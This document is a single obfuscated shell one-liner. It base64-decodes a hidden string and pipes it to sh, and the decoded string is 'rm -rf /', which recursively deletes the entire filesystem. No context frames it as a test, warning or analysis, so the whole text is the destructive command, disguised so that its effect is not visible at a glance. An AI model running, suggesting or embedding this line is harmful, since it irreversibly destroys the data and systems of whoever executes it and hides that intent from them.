echo "cm0gLXJmIC8=" | base64 -d | sh
